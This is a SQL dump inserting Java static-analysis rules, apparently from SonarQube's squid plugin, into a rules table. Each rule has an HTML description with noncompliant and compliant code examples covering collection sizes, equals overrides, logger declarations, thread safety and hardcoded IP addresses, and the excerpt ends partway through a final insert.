INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (829, 'Collection sizes and array length comparisons should make sense', 'S3981', NULL, 'squid', '<p>The size of a collection and the length of an array are always greater than or equal to zero. So testing that a size or length is greater than or
equal to zero doesn''t make sense, since the result is always <code>true</code>. Similarly testing that it is less than zero will always return
<code>false</code>. Perhaps the intent was to check the non-emptiness of the collection or array instead. </p>
<h2>Noncompliant Code Example</h2>
<pre>
if (myList.size() &gt;= 0) { ... }

if (myList.size() &lt; 0) { ... }

boolean result = myArray.length &gt;= 0;

if (0 &gt; myArray.length) { ... }
</pre>
<h2>Compliant Solution</h2>
<pre>
if (!myList.isEmpty()) { ... }

if (myArray.length &gt;= 42) { ... }
</pre>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '2min', NULL, NULL, NULL, false, 'HTML', 1510817812851, 1510817812851, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (842, 'Track uses of "NOPMD" suppression comments', 'S1310', NULL, 'squid', '<p>This rule allows you to track the use of the PMD suppression comment mechanism. </p>
<h2>Noncompliant Code Example</h2>
<pre>
// NOPMD
</pre>', 1, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, 'bad-practice', false, 'HTML', 1510817812870, 1510817812870, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (830, 'Classes should not be coupled to too many other classes (Single Responsibility Principle)', 'S1200', NULL, 'squid', '<p>According to the Single Responsibility Principle, introduced by Robert C. Martin in his book "Principles of Object Oriented Design", a class should
have only one responsibility:</p>
<blockquote>
  <p>If a class has more than one responsibility, then the responsibilities become coupled.</p>
  <p>Changes to one responsibility may impair or inhibit the class'' ability to meet the others.</p>
  <p>This kind of coupling leads to fragile designs that break in unexpected ways when changed.</p>
</blockquote>
<p>Classes which rely on many other classes tend to aggregate too many responsibilities and should be split into several smaller ones.</p>
<p>Nested classes dependencies are not counted as dependencies of the outer class.</p>
<h2>Noncompliant Code Example</h2>
<p>With a threshold of 5:</p>
<pre>
class Foo {                        // Noncompliant - Foo depends on too many classes: T1, T2, T3, T4, T5, T6 and T7
  T1 a1;                           // Foo is coupled to T1
  T2 a2;                           // Foo is coupled to T2
  T3 a3;                           // Foo is coupled to T3

  public T4 compute(T5 a, T6 b) {  // Foo is coupled to T4, T5 and T6
    T7 result = a.getResult(b);    // Foo is coupled to T7
    return result;
  }

  public static class Bar {        // Compliant - Bar depends on 2 classes: T8 and T9
    T8 a8;
    T9 a9;
  }
}
</pre>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '2h', NULL, NULL, 'brain-overload', false, 'HTML', 1510817812852, 1510817812853, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (831, 'Web applications should not have a "main" method', 'S2653', NULL, 'squid', '<p>There is no reason to have a <code>main</code> method in a web application. It may have been useful for debugging during application development,
but such a method should never make it into production. Having a <code>main</code> method in a web application opens a door to the application logic
that an attacker may never be able to reach (but watch out if one does!), but it is a sloppy practice and indicates that other problems may be
present.</p>
<p>This rule raises an issue when a <code>main</code> method is found in a servlet or an EJB.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class MyServlet extends HttpServlet {
  public void doGet(HttpServletRequest req, HttpServletResponse res) throws ServletException, IOException {
    if (userIsAuthorized(req)) {
      updatePrices(req);
    }
  }

  public static void main(String[] args) { // Noncompliant
    updatePrices(req);
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/489.html">MITRE, CWE-489</a> - Leftover Debug Code </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/VoB8Bw">CERT, ENV06-J.</a> - Production code must not contain debugging entry points
  </li>
</ul>', 3, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'cert,cwe,jee', false, 'HTML', 1510817812854, 1510817812854, 3);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (832, 'Exception should not be created without being thrown', 'S3984', NULL, 'squid', '<p>Creating a new <code>Throwable</code> without actually throwing it is useless and is probably due to a mistake.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (x &lt; 0)
  new IllegalArgumentException("x must be nonnegative");
</pre>
<h2>Compliant Solution</h2>
<pre>
if (x &lt; 0)
  throw new IllegalArgumentException("x must be nonnegative");
</pre>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '2min', NULL, NULL, NULL, false, 'HTML', 1510817812855, 1510817812856, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (833, '"equals" method overrides should accept "Object" parameters', 'S1201', NULL, 'squid', '<p>"equals" as a method name should be used exclusively to override <code>Object.equals(Object)</code> to prevent any confusion.</p>
<p>It is tempting to overload the method to take a specific class instead of <code>Object</code> as parameter, to save the class comparison check.
However, this will not work as expected when that is the only override.</p>
<h2>Noncompliant Code Example</h2>
<pre>
class MyClass {
  private int foo = 1;

  public boolean equals(MyClass o) {  // Noncompliant; does not override Object.equals(Object)
    return o != null &amp;&amp; o.foo == this.foo;
  }

  public static void main(String[] args) {
    MyClass o1 = new MyClass();
    Object o2 = new MyClass();
    System.out.println(o1.equals(o2));  // Prints "false" because o2 an Object not a MyClass
  }
}

class MyClass2 {
  public boolean equals(MyClass2 o) {  // Ignored; `boolean equals(Object)` also present
    //..
  }

  public boolean equals(Object o) {
    //...
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
class MyClass {
  private int foo = 1;

  @Override
  public boolean equals(Object o) {
    if (this == o) {
        return true;
    }
    if (o == null || getClass() != o.getClass()) {
      return false;
    }

    MyClass other = (MyClass)o;
    return this.foo == other.foo;
  }

  /* ... */
}

class MyClass2 {
  public boolean equals(MyClass2 o) {
    //..
  }

  public boolean equals(Object o) {
    //...
  }
}
</pre>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, 'suspicious', false, 'HTML', 1510817812856, 1510817812857, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (834, '"public static" fields should be constant', 'S1444', NULL, 'squid', '<p>There is no good reason to declare a field "public" and "static" without also declaring it "final". Most of the time this is a kludge to share a
state among several objects. But with this approach, any object can do whatever it wants with the shared state, such as setting it to
<code>null</code>. </p>
<h2>Noncompliant Code Example</h2>
<pre>
public class Greeter {
  public static Foo foo = new Foo();
  ...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class Greeter {
  public static final Foo FOO = new Foo();
  ...
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/500.html">MITRE, CWE-500</a> - Public Static Field Not Marked Final </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/QQBqAQ">CERT OBJ10-J.</a> - Do not use public static nonfinal fields </li>
</ul>', 1, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '20min', NULL, NULL, 'cert,cwe', false, 'HTML', 1510817812857, 1510817812858, 3);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (835, 'Week Year ("YYYY") should not be used for date formatting', 'S3986', NULL, 'squid', '<p>Few developers are aware of the difference between <code>Y</code> for "Week year" and <code>y</code> for Year when formatting and parsing a date
with <code>SimpleDateFormat</code>. That''s likely because for most dates, Week year and Year are the same, so testing at any time other than the first
or last week of the year will yield the same value for both <code>y</code> and <code>Y</code>. But in the last week of December and the first week of
January, you may get unexpected results.</p>
<p>According to the <a href="http://docs.oracle.com/javase/8/docs/api/java/util/GregorianCalendar.html#week_year">Javadoc</a>:</p>
<blockquote>
  <p>A week year is in sync with a WEEK_OF_YEAR cycle. All weeks between the first and last weeks (inclusive) have the same week year value.
  Therefore, the first and last days of a week year may have different calendar year values.</p>
  <p>For example, January 1, 1998 is a Thursday. If getFirstDayOfWeek() is MONDAY and getMinimalDaysInFirstWeek() is 4 (ISO 8601 standard compatible
  setting), then week 1 of 1998 starts on December 29, 1997, and ends on January 4, 1998. The week year is 1998 for the last three days of calendar
  year 1997. If, however, getFirstDayOfWeek() is SUNDAY, then week 1 of 1998 starts on January 4, 1998, and ends on January 10, 1998; the first three
  days of 1998 then are part of week 53 of 1997 and their week year is 1997.</p>
</blockquote>
<h2>Noncompliant Code Example</h2>
<pre>
Date date = new SimpleDateFormat("yyyy/MM/dd").parse("2015/12/31");
String result = new SimpleDateFormat("YYYY/MM/dd").format(date);   //Noncompliant; yields ''2016/12/31''
</pre>
<h2>Compliant Solution</h2>
<pre>
Date date = new SimpleDateFormat("yyyy/MM/dd").parse("2015/12/31");
String result = new SimpleDateFormat("yyyy/MM/dd").format(date);   //Yields ''2015/12/31'' as expected
</pre>
<h2>Exceptions</h2>
<pre>
Date date = new SimpleDateFormat("yyyy/MM/dd").parse("2015/12/31");
String result = new SimpleDateFormat("YYYY-ww").format(date);  //compliant, ''Week year'' is used along with ''Week of year''. result = ''2016-01''
</pre>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '2min', NULL, NULL, 'suspicious', false, 'HTML', 1510817812858, 1510817812859, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (838, 'Octal values should not be used', 'S1314', NULL, 'squid', '<p>Integer literals starting with a zero are octal rather than decimal values. While using octal values is fully supported, most developers do not
have experience with them. They may not recognize octal values as such, mistaking them instead for decimal values.</p>
<h2>Noncompliant Code Example</h2>
<pre>
int myNumber = 010;   // Noncompliant. myNumber will hold 8, not 10 - was this really expected?
</pre>
<h2>Compliant Solution</h2>
<pre>
int myNumber = 8;
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 7.1 - Octal constants (other than zero) and octal escape sequences shall not be used. </li>
  <li> MISRA C++:2008, 2-13-2 - Octal constants (other than zero) and octal escape sequences (other than "\0") shall not be used </li>
  <li> MISRA C:2012, 7.1 - Octal constants shall not be used </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/_QC7AQ">CERT, DCL18-C.</a> - Do not begin integer constants with 0 when specifying a
  decimal value </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/hYClBg">CERT, DCL50-J.</a> - Use visually distinct identifiers </li>
</ul>', 4, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'cert,misra,pitfall', false, 'HTML', 1510817812862, 1510817812863, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (839, 'Track uses of "CHECKSTYLE:OFF" suppression comments', 'S1315', NULL, 'squid', '<p>This rule allows you to track the use of the Checkstyle suppression comment mechanism. </p>
<h2>Noncompliant Code Example</h2>
<pre>
// CHECKSTYLE:OFF
</pre>', 1, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'bad-practice', false, 'HTML', 1510817812863, 1510817812864, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (840, '"StringBuilder" and "StringBuffer" should not be instantiated with a character', 'S1317', NULL, 'squid', '<p>Instantiating a <code>StringBuilder</code> or a <code>StringBuffer</code> with a character is misleading because most Java developers would expect
the character to be the initial value of the <code>StringBuffer</code>. </p>
<p>What actually happens is that the int representation of the character is used to determine the initial size of the <code>StringBuffer</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
StringBuffer foo = new StringBuffer(''x'');   //equivalent to StringBuffer foo = new StringBuffer(120);
</pre>
<h2>Compliant Solution</h2>
<pre>
StringBuffer foo = new StringBuffer("x");
</pre>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'pitfall', false, 'HTML', 1510817812864, 1510817812865, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (841, 'Declarations should use Java collection interfaces such as "List" rather than specific implementation classes such as "LinkedList"', 'S1319', NULL, 'squid', '<p>The purpose of the Java Collections API is to provide a well defined hierarchy of interfaces in order to hide implementation details.</p>
<p>Implementing classes must be used to instantiate new collections, but the result of an instantiation should ideally be stored in a variable whose
type is a Java Collection interface.</p>
<p>This rule raises an issue when an implementation class:</p>
<ul>
  <li> is returned from a <code>public</code> method. </li>
  <li> is accepted as an argument to a <code>public</code> method. </li>
  <li> is exposed as a <code>public</code> member. </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
public class Employees {
  private HashSet&lt;Employee&gt; employees = new HashSet&lt;Employee&gt;();  // Noncompliant - "employees" should have type "Set" rather than "HashSet"

  public HashSet&lt;Employee&gt; getEmployees() {                       // Noncompliant
    return employees;
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class Employees {
  private Set&lt;Employee&gt; employees = new HashSet&lt;Employee&gt;();      // Compliant

  public Set&lt;Employee&gt; getEmployees() {                           // Compliant
    return employees;
  }
}
</pre>', 1, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, 'bad-practice', false, 'HTML', 1510817812869, 1510817812869, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (843, 'Conditionals should start on new lines', 'S3972', NULL, 'squid', '<p>Code is clearest when each statement has its own line. Nonetheless, it is a common pattern to combine on the same line an <code>if</code> and its
resulting <em>then</em> statement. However, when an <code>if</code> is placed on the same line as the closing <code>} </code> from a preceding
<code>else</code> or <code>else if</code>, it is either an error - <code>else</code> is missing - or the invitation to a future error as maintainers
fail to understand that the two statements are unconnected.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (condition1) {
  // ...
} if (condition2) {  // Noncompliant
  //...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
if (condition1) {
  // ...
} else if (condition2) {
  //...
}
</pre>
<p>Or</p>
<pre>
if (condition1) {
  // ...
}

if (condition2) {
  //...
}
</pre>', 3, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, 'suspicious', false, 'HTML', 1510817812871, 1510817812871, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (844, 'Loggers should be "private static final" and should share a naming convention', 'S1312', NULL, 'squid', '<p>Loggers should be:</p>
<ul>
  <li> <code>private</code>: not accessible outside of their parent classes. If another class needs to log something, it should instantiate its own
  logger. </li>
  <li> <code>static</code>: not dependent on an instance of a class (an object). When logging something, contextual information can of course be
  provided in the messages but the logger should be created at class level to prevent creating a logger along with each object. </li>
  <li> <code>final</code>: created once and only once per class. </li>
</ul>
<h2>Noncompliant Code Example</h2>
<p>With a default regular expression of <code>LOG(?:GER)?</code>:</p>
<pre>
public Logger logger = LoggerFactory.getLogger(Foo.class);  // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
private static final Logger LOGGER = LoggerFactory.getLogger(Foo.class);
</pre>
<h2>Exceptions</h2>
<p>Variables of type <code>org.apache.maven.plugin.logging.Log</code> are ignored.</p>', 1, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'convention', false, 'HTML', 1510817812872, 1510817812872, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (845, 'Getters and setters should be synchronized in pairs', 'S2886', NULL, 'squid', '<p>When one part of a getter/setter pair is <code>synchronized</code> the other part should be too. Failure to synchronize both sides of a pair may
result in inconsistent behavior at runtime as callers access an inconsistent method state.</p>
<p>This rule raises an issue when either the method or the contents of one method in a getter/setter pair are synchrnoized but the other is not.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class Person {
  String name;
  int age;

  public synchronized void setName(String name) {
    this.name = name;
  }

  public String getName() {  // Noncompliant
    return this.name;
  }

  public void setAge(int age) {  // Noncompliant
    this.age = age;
  }

  public int getAge() {
    synchronized (this) {
      return this.age;
    }
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class Person {
  String name;
  int age;

  public synchronized void setName(String name) {
    this.name = name;
  }

  public synchronized String getName() {
    return this.name;
  }

  public void setAge(int age) {
    synchronized (this) {
      this.age = age;
   }
  }

  public int getAge() {
    synchronized (this) {
      return this.age;
    }
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/I4BoAg">CERT, VNA01-J.</a> - Ensure visibility of shared references to immutable
  objects </li>
</ul>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'cert,multi-threading', false, 'HTML', 1510817812874, 1510817812874, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (846, 'IP addresses should not be hardcoded', 'S1313', NULL, 'squid', '<p>Hardcoding an IP address into source code is a bad idea for several reasons:</p>
<ul>
  <li> a recompile is required if the address changes </li>
  <li> it forces the same address to be used in every environment (dev, sys, qa, prod) </li>
  <li> it places the responsibility of setting the value to use in production on the shoulders of the developer </li>
  <li> it allows attackers to decompile the code and thereby discover a potentially sensitive address </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
String ip = "127.0.0.1";
Socket socket = new Socket(ip, 6667);
</pre>
<h2>Compliant Solution</h2>
<pre>
String ip = System.getProperty("myapplication.ip");
Socket socket = new Socket(ip, 6667);
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/qQCHAQ">CERT, MSC03-J.</a> - Never hard code sensitive information </li>
</ul>', 1, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '30min', NULL, NULL, 'cert', false, 'HTML', 1510817812874, 1510817812875, 3);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (847, 'Non-thread-safe fields should not be static', 'S2885', NULL, 'squid', '<p>Not all classes in the standard Java library were written to be thread-safe. Using them in a multi-threaded manner is highly likely to cause data
problems or exceptions at runtime.</p>
<p>This rule raises an issue when an instance of <code>Calendar</code>, <code>DateFormat</code>, <code>javax.xml.xpath.XPath</code>, or
<code>javax.xml.validation.SchemaFactory</code> is marked <code>static</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class MyClass {
  static private SimpleDateFormat format = new SimpleDateFormat("HH-mm-ss");  // Noncompliant
  static private Calendar calendar = Calendar.getInstance();  // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
public class MyClass {
  private SimpleDateFormat format = new SimpleDateFormat("HH-mm-ss");
  private Calendar calendar = Calendar.getInstance();
</pre>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '15min', NULL, NULL, 'multi-threading', false, 'HTML', 1510817812875, 1510817812876, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (848, 'Track breaches of architectural constraints', 'ArchitecturalConstraint', 'S1212', 'squid', '<p>A source code comply to an architectural model when it fully adheres to a set of architectural constraints. A constraint allows to deny references
between classes by pattern.</p>
<p>You can for instance use this rule to :</p>
<ul>
  <li> forbid access to <code>**.web.**</code> from <code>**.dao.**</code> classes </li>
  <li> forbid access to <code>java.util.Vector</code>, <code>java.util.Hashtable</code> and <code>java.util.Enumeration</code> from any classes </li>
  <li> forbid access to <code>java.sql.**</code> from <code>**.ui.**</code> and <code>**.web.**</code> classes </li>
</ul>
<h2>Deprecated</h2>
<p>This rule is deprecated, and will eventually be removed.</p>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, true, 'HTML', 1510817812876, 1510817812876, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (849, 'The Object.finalize() method should not be overriden', 'ObjectFinalizeOverridenCheck', 'S1113', 'squid', '<p>The <code>Object.finalize()</code> method is called on an object by the garbage collector when it determines that there are no more references to
the object. But there is absolutely no warranty that this method will be called AS SOON AS the last references to the object are removed. It can be
few microseconds to few minutes later. So when system resources need to be disposed by an object, it''s better to not rely on this asynchronous
mechanism to dispose them.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class MyClass {
  ...
  protected void finalize() {
    releaseSomeResources();    // Noncompliant
  }
  ...
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/H4cbAQ">CERT, MET12-J.</a> - Do not use finalizers </li>
</ul>', 3, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '20min', NULL, NULL, 'cert,unpredictable', false, 'HTML', 1510817812878, 1510817812878, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (850, '"for" loop stop conditions should be invariant', 'ForLoopCounterChangedCheck', 'S127', 'squid', '<p>A <code>for</code> loop stop condition should test the loop counter against an invariant value (i.e. one that is true at both the beginning and
ending of every loop iteration). Ideally, this means that the stop condition is set to a local variable just before the loop begins. </p>
<p>Stop conditions that are not invariant are slightly less efficient, as well as being difficult to understand and maintain, and likely lead to the
introduction of errors in the future.</p>
<p>This rule tracks three types of non-invariant stop conditions:</p>
<ul>
  <li> When the loop counters are updated in the body of the <code>for</code> loop </li>
  <li> When the stop condition depend upon a method call </li>
  <li> When the stop condition depends on an object property, since such properties could change during the execution of the loop. </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
for (int i = 0; i &lt; 10; i++) {
  ...
  i = i - 1; // Noncompliant; counter updated in the body of the loop
  ...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
for (int i = 0; i &lt; 10; i++) {...}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 13.6 - Numeric variables being used within a <em>for</em> loop for iteration counting shall not be modified in the body of the
  loop. </li>
  <li> MISRA C++:2008, 6-5-3 - The <em>loop-counter</em> shall not be modified within <em>condition</em> or <em>statement</em>. </li>
</ul>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, 'misra,pitfall', false, 'HTML', 1510817812879, 1510817812879, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (851, 'Method parameters, caught exceptions and foreach variables'' initial values should not be ignored', 'S1226', NULL, 'squid', '<p>While it is technically correct to assign to parameters from within method bodies, doing so before the parameter value is read is likely a bug.
Instead, initial values of parameters, caught exceptions, and foreach parameters should be, if not treated as <code>final</code>, then at least read
before reassignment.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public void doTheThing(String str, int i, List&lt;String&gt; strings) {
  str = Integer.toString(i);  // Noncompliant

  for (String s : strings) {
    s = "hello world";  // Noncompliant
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2012, 17.8 - A function parameter should not be modified </li>
</ul>', 1, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'misra', false, 'HTML', 1510817812880, 1510817812880, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (852, 'Silly bit operations should not be performed', 'S2437', NULL, 'squid', '<p>Certain bit operations are just silly and should not be performed because their results are predictable.</p>
